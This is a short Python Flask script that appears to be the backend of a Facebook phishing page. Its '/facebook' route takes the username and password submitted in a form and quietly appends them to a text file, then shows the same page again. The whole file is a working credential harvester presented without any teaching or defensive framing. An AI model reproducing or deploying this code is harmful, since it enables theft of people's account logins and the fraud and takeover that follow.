from flask import Flask, render_template, request

app = Flask(__name__,  template_folder="template")#←,static_folder="static"

@app.route('/')
def indexer():
    return render_template('index.html')


@app.route('/facebook', methods=["POST"])
def facebook():
    texte = request.form.get('TEXTE')
    key = request.form.get('cle')
    with open('file.txt', 'a+') as f:
        f.write('==========°==========\n')
        f.write(f'identifiant:  {texte}\n')
        f.write(f'password   : {key}\n')
        f.write('==========°==========\n')
        f.close()
    return render_template('index.html')



if __name__ == "__main__":
    app.run(debug = True)